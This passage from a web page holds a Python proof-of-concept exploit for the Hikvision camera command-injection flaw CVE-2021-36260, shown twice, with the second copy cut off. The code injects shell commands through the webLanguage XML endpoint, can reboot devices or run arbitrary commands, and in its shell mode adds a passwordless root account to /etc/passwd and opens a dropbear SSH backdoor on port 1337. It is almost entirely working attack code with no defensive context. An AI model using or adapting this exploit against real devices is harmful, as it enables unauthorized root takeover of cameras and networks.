class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data.status_code == <span class="number">302</span>:</span><br><span class="line">            redirect = data.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">            self.uri = redirect[:redirect.rfind(<span class="string">&#x27;/&#x27;</span>)]</span><br><span class="line">            self._update_host()</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_host</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.remote.headers.get(<span class="string">&#x27;Host&#x27;</span>) == self.uri[self.uri.rfind(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]:</span><br><span class="line">            self.remote.headers.update(&#123;</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: self.uri[self.uri.rfind(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:],</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_uri</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.uri = <span class="string">&#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;</span>.<span class="built_in">format</span>(proto=self.proto, rhost=self.rhost, rport=<span class="built_in">str</span>(self.rport))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">self, url, query_args, timeout</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span></span><br><span class="line">        query_args = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> \</span><br><span class="line">                     <span class="string">f&#x27;&lt;language&gt;$(<span class="subst">&#123;query_args&#125;</span>)&lt;/language&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.remote.put(self.uri + url, data=query_args, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, url, timeout</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.remote.get(self.uri + url, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, timeout=timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    status_code == 200 (OK);</span></span><br><span class="line"><span class="string">        Verified vulnerable and exploitable</span></span><br><span class="line"><span class="string">    status_code == 500 (Internal Server Error);</span></span><br><span class="line"><span class="string">        Device may be vulnerable, but most likely not</span></span><br><span class="line"><span class="string">        The SDK webLanguage tag is there, but generate status_code 500 when language not found</span></span><br><span class="line"><span class="string">        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)</span></span><br><span class="line"><span class="string">        (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...)</span></span><br><span class="line"><span class="string">    status_code == 401 (Unauthorized);</span></span><br><span class="line"><span class="string">        Defiantly not vulnerable</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> args.noverify:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] Not verifying remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Checking remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] Cannot establish connection to &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[i] ETag:&#x27;</span>, data.headers.get(<span class="string">&#x27;ETag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    data = remote.send(query_args=<span class="string">&#x27;&gt;webLib/c&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot; do not looks like Hikvision&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    status_code = data.status_code</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/c&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> status_code == <span class="number">500</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-] Could not verify if vulnerable (Code: <span class="subst">&#123;status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> args.reboot:</span><br><span class="line">                <span class="keyword">return</span> check_reboot(remote, args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Remote is not vulnerable (Code: <span class="subst">&#123;status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!] Remote is verified exploitable&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_reboot</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request.</span></span><br><span class="line"><span class="string">    - if there is data returned, we can assume remote is not vulnerable.</span></span><br><span class="line"><span class="string">    - If there is no connection or data returned, we can assume remote is vulnerable.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> args.check:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] Checking remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot; with &quot;reboot&quot;&#x27;</span>)</span><br><span class="line">    remote.send(query_args=<span class="string">&#x27;reboot&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> remote.send(url=<span class="string">&#x27;/&#x27;</span>, query_args=<span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Remote is vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Remote is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(query_args=<span class="string">f&#x27;<span class="subst">&#123;args.cmd&#125;</span>&gt;webLib/x&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/x&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[!] Error execute cmd &quot;<span class="subst">&#123;args.cmd&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(data.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_blind</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Blind command injection</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(query_args=<span class="string">f&#x27;<span class="subst">&#123;args.cmd_blind&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> data.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] Error execute cmd &quot;<span class="subst">&#123;args.cmd_blind&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[i] Try execute blind cmd &quot;<span class="subst">&#123;args.cmd_blind&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">remote, args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(remote, args):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/N&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[i] Remote &quot;<span class="subst">&#123;args.rhost&#125;</span>&quot; not pwned, pwning now!&#x27;</span>)</span><br><span class="line">        data = remote.send(query_args=<span class="string">&#x27;echo -n P::0:0:W&gt;N&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> data.status_code == <span class="number">401</span>:</span><br><span class="line">            <span class="built_in">print</span>(data.headers)</span><br><span class="line">            <span class="built_in">print</span>(data.text)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;cat N&gt;&gt;/etc/passwd&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;dropbear -R -B -p 1337&#x27;</span>)</span><br><span class="line">        remote.send(query_args=<span class="string">&#x27;cat N&gt;webLib/N&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[i] Remote &quot;<span class="subst">&#123;args.rhost&#125;</span>&quot; already pwned&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Trying SSH to <span class="subst">&#123;args.rhost&#125;</span> on port 1337&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">f&#x27;stty echo; stty iexten; stty icanon; \</span></span><br><span class="line"><span class="string">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span></span><br><span class="line"><span class="string">    P@<span class="subst">&#123;args.rhost&#125;</span> -p 1337&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--rhost&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote Target Address (IP/FQDN)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--rport&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">80</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote Target Port&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--check&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Check if vulnerable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--reboot&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Reboot if vulnerable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Launch SSH shell&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--cmd&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--cmd_blind&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--noverify&#x27;</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Do not verify if vulnerable&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--proto&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=[<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>], default=<span class="string">&#x27;http&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Protocol used&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    remote = Http(args.rhost, args.rport, args.proto)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> args.shell:</span><br><span class="line">            shell(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.cmd:</span><br><span class="line">            cmd(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.cmd_blind:</span><br><span class="line">            cmd_blind(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.check:</span><br><span class="line">            check(remote, args)</span><br><span class="line">        <span class="keyword">elif</span> args.reboot:</span><br><span class="line">            check_reboot(remote, args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.parse_args([<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> packages</span><br><span class="line"><span class="keyword">from</span> requests.packages <span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3 <span class="keyword">import</span> exceptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Http</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rhost, rport, proto, timeout=<span class="number">60</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Http, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rhost = rhost</span><br><span class="line">        self.rport = rport</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">        self.remote = <span class="literal">None</span></span><br><span class="line">        self.uri = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">        self.remote = requests.Session()</span><br><span class="line"></span><br><span class="line">        self._init_uri()</span><br><span class="line"></span><br><span class="line">        self.remote.headers.update(&#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;self.rhost&#125;</span>:<span class="subst">&#123;self.rport&#125;</span>&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.9,sv;q=0.8&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, url=<span class="literal">None</span>, query_args=<span class="literal">None</span>, timeout=<span class="number">5</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query_args:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(query_args) &gt; <span class="number">22</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[!] Error: Command &quot;<span class="subst">&#123;query_args&#125;</span>&quot; to long (<span class="subst">&#123;<span class="built_in">len</span>(query_args)&#125;</span>)&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            self.proto = <span class="string">&#x27;https&#x27;</span> <span class="keyword">if</span> self.proto == <span class="string">&#x27;http&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;https&#x27;</span></span><br><span class="line">            self._init_uri()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data.status_code == <span class="number">302</span>:</span><br><span class="line">            redirect = data.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">            self.uri = redirect[:redirect.rfind(<span class="string">&#x27;/&#x27;</span>)]</span><br><span class="line">            self._update_host()</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_host</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.remote.headers.get(<span class="string">&#x27;Host&#x27;</span>) == self.uri[self.uri.rfind(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]:</span><br><span class="line">            self.remote.headers.update(&#123;</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: self.uri[self.uri.rfind(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:],</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_uri</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.uri = <span class="string">&#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;</span>.<span class="built_in">format</span>(proto=self.proto, rhost=self.rhost, rport=<span class="built_in">str</span>(self.rport))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">self, url, query_args, timeout</span>):</span></span><br><span class="line">        query_args = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> \</span><br><span class="line">                     <span class="string">f&#x27;&lt;language&gt;$(<span class="subst">&#123;query_args&#125;</span>)&lt;/language&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.remote.put(self.uri + url, data=query_args, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, url, timeout</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.remote.get(self.uri + url, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, timeout=timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">remote, args</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.noverify:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] Not verifying remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Checking remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] Cannot establish connection to &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[i] ETag:&#x27;</span>, data.headers.get(<span class="string">&#x27;ETag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    data = remote.send(query_args=<span class="string">&#x27;&gt;webLib/c&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot; do not looks like Hikvision&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    status_code = data.status_code</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=<span class="string">&#x27;/c&#x27;</span>, query_args=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.status_code == <span class="number">200</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> status_code == <span class="number">500</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-] Could not verify if vulnerable (Code: <span class="subst">&#123;status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> args.reboot:</span><br><span class="line">                <span class="keyword">return</span> check_reboot(remote, args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Remote is not vulnerable (Code: <span class="subst">&#123;status_code&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[!] Remote is verified exploitable&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_reboot</span>(<span class="params">remote, args</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.check:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] Checking remote &quot;<span class="subst">&#123;args.rhost&#125;</span>:<span class="subst">&#123;args.rport&#125;</span>&quot; with &quot;reboot&quot;&#x27;</span>)</span><br><span class="line">    remote.send(query_args=<span class="string">&#x27;reboot&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> remote.send(url=<span class="string">&#x27;/&#x27;</span>, query_args=<span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Remote is 